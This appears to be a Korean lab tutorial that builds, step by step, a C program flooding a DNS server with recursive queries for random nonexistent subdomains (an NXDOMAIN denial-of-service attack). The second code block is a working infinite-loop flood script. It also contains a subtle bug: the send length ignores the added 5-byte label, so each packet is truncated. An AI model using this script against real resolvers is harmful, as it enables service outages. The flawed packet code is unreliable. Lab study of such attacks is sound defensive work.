# NXDOMAIN Flooding 공격 실습   

### NXDOMAIN Flooding  


<br>


### dns 질의 코드 작성    

<figure style="max-width: 800px; margin: 0;">
  <div style="display: flex; gap: 10px; align-items: flex-start;">
    <img src="./img/nxdomain_flood.png" alt="정보통신기술용어해설 dns 구조" style="width: 50%; height: auto;">
    <img src="./img/nxdomain_flood1.png" alt="정보통신기술용어해설 dns 구조" style="width: 50%; height: auto;">
  </div>
  
  <figcaption style="font-size: 0.9rem; color: #666; margin-top: 10px;">
    출처: <a href="http://www.ktword.co.kr/test/view/view.php?no=2251" target="_blank" rel="noopener noreferrer" style="color: #0073e6; text-decoration: none;">정보통신기술용어해설</a>,
    DNS 메시지
  </figcaption>
</figure>





우선 공격 코드를 작성하기 전에 간단하게 dos.lab 에 대해 질의하는 코드를 먼저 작성해본 뒤, 존재하지 않는 하위 도메인을 질의하는 코드를 작성해보겠습니다.  


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

int main() {
    int msg = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr("192.168.125.10"); // 실습용 dns 서버


    unsigned char packet[64] = {
        0x00, 0x00, // 임시 id (랜덤으로 매번 변경 예정): 0x0000
        0x01, 0x00, // Flags: RD = 1
        0x00, 0x01, // Questions 카운트: 1
        0x00, 0x00, // Answer 카운트: 0
        0x00, 0x00, // 네임서버 카운트: 0
        0x00, 0x00  // 부가정보 레코즈 카운터: 0
    };


    unsigned char query[] = {
        0x03, 'd','o','s',
        0x03, 'l','a','b', 
        0x00,
        0x00, 0x01, // Type: A (IPv4)
        0x00, 0x01  // Class: IN
    };

    memcpy(packet + 12, query, sizeof(query));

    srand(time(NULL));

    // id 값은 매번 랜덤으로 변경
    uint16_t dns_id = (uint16_t)(rand() & 0xFFFF);
    *(uint16_t *)packet = htons(dns_id);

    // 쿼리 전송
    sendto(msg, packet, 12 + sizeof(query), 0, (struct sockaddr*)&dest, sizeof(dest));
    printf("Query Sent - id: 0x%04X\n", dns_id);
    // 응답 확인
    unsigned char buffer[512];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);

    int res_len = recvfrom(msg, buffer, sizeof(buffer), 0, (struct sockaddr*)&from, &from_len);

    if (res_len > 0) {
        // 응답 패킷의 id를 알기 위해 처음 2바이트를 추출
        uint16_t res_id = ntohs(*(uint16_t *)buffer);
        printf("Received id: 0x%04X\n", res_id);
        // 응답받은 ip 주소를 출력하기 위해 마지막 4바이트 추출
        if (res_len >= 4) {
            printf("IP Address: %d.%d.%d.%d\n",
                   buffer[res_len-4], buffer[res_len-3], 
                   buffer[res_len-2], buffer[res_len-1]);
        }
    } else {
        printf("No response.\n");
    }

    close(msg);

    return 0;
}
```
<br>

매 질의마다 다른 id를 전송할 수 있도록 `dns_id`를 랜덤으로 설정할 수 있도록 하였습니다.  

그리고 flag 중에 RD flag를 1로 켜두었는데 이는 Recursion Desired로 서버가 직접 존재하지 않는 도메인에 대해 알아보며 더 많은 자원을 소모시키기 위해서 켜둔 것입니다. 

질의 영역에서는 쿼리 name은 dos.lab에 해당하는 `3 d o s 3 l a b 0`으로 맞춰주었고 잘의 타입은 도메인 주소를 찾는 A를, 등급은 인터넷에 해당하는 IN(1)을 사용하였습니다.  


![정보통신기술용어해설 dns 구조](./img/nxdomain_flood3.png)  

응답 패킷 헤더의 맨 앞 2바이트는 id 이므로 이것을 가져오고, 마지막 4바이트가 리소스 데이터인 ip 주소가 될 것이므로 맨 뒤 4바이트에서 ip 주소를 가져와 출력해줍니다.  

<br> 

![alt text](./img/nxdomain_flood2.png)    

이제 실행시켜주면 실행마다 다른 id를 가지는 질의가 완성되었습니다.  

<br>

### 공격 코드 작성   

이제 변형하여 공격코드를 작성해주겠습니다.  


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

int main() {
    int msg = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr("192.168.125.10"); // 실습용 dns 서버


    unsigned char packet[64] = {
        0x00, 0x00, // 임시 id (랜덤으로 매번 변경 예정): 0x0000
        0x01, 0x00, // Flags: RD = 1
        0x00, 0x01, // Questions 카운트: 1
        0x00, 0x00, // Answer 카운트: 0
        0x00, 0x00, // 네임서버 카운트: 0
        0x00, 0x00  // 부가정보 레코즈 카운터: 0
    };


    unsigned char query[] = {
        0x03, 'd','o','s',
        0x03, 'l','a','b', 
        0x00,
        0x00, 0x01, // Type: A (IPv4)
        0x00, 0x01  // Class: IN
    };

    srand(time(NULL));

    while(1){
        // 0x04 , < 랜덤 4바이트 > 생성
        unsigned char buf[5];
        buf[0] = 0x04;
        for (int i = 1; i < 5; i++) {
            buf[i] = 'a' + (rand() % 26); 
        }
        
        memcpy(packet + 12, buf, 5);
        memcpy(packet + 17, query, sizeof(query));
        
        // id 값은 매번 랜덤으로 변경
        uint16_t dns_id = (uint16_t)(rand() & 0xFFFF);
        *(uint16_t *)packet = htons(dns_id);

        // 쿼리 전송
        sendto(msg, packet, 12 + sizeof(query), 0, (struct sockaddr*)&dest, sizeof(dest));
        printf("Query Sent - id: 0x%04X\n", dns_id);
        // 응답 확인
        unsigned char buffer[512];
        struct sockaddr_in from;
        socklen_t from_len = sizeof(from);

        int res_len = recvfrom(msg, buffer, sizeof(buffer), 0, (struct sockaddr*)&from, &from_len);

        if (res_len > 0) {
            // 응답 패킷의 id를 알기 위해 처음 2바이트를 추출
            uint16_t res_id = ntohs(*(uint16_t *)buffer);
            printf("Received id: 0x%04X\n", res_id);
            // 응답받은 ip 주소를 출력하기 위해 마지막 4바이트 추출
            if (res_len >= 4) {
                printf("IP Address: %d.%d.%d.%d\n",
                    buffer[res_len-4], buffer[res_len-3], 
                    buffer[res_len-2], buffer[res_len-1]);
            }
        } else {
            printf("No response.\n");
        }
    }

    close(msg);

    return 0;
}
```

기존 전송을 반복하게 하고 앞에 무작위 소문자 알파벳 4개를 붙여 임의의 주소를 만들어 보낼 수 있게 만들었습니다.  

<br>

![alt text](./img/nxdomain_flood4.png)  

이걸 보내보면 무수히 빠른 속도로 존재하지않는 임의의 도메인 주소를 찾는 것을 확인해볼 수 있습니다.  

### 


### Reference

- 정보통신기술용어해설 dns 구조 : http://www.ktword.co.kr/test/view/view.php?no=2251